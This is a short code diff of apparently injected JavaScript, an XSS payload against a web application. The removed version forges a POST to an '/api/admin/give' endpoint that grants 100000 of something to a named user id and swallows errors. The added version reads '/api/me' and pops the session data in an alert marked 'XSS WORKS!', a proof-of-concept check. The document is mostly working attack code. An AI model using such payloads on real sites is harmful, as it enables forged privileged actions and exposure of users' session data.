@@ -1,5 +1,4 @@
-fetch('/api/admin/give', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ user: '982815197678931998', amount: 100000 })
-}).catch(() => {});
+fetch('/api/me')
+  .then(r => r.text())
+  .then(t => alert('XSS WORKS! My session data: ' + t.substring(0, 50)))
+  .catch(e => alert('Fetch error: ' + e));
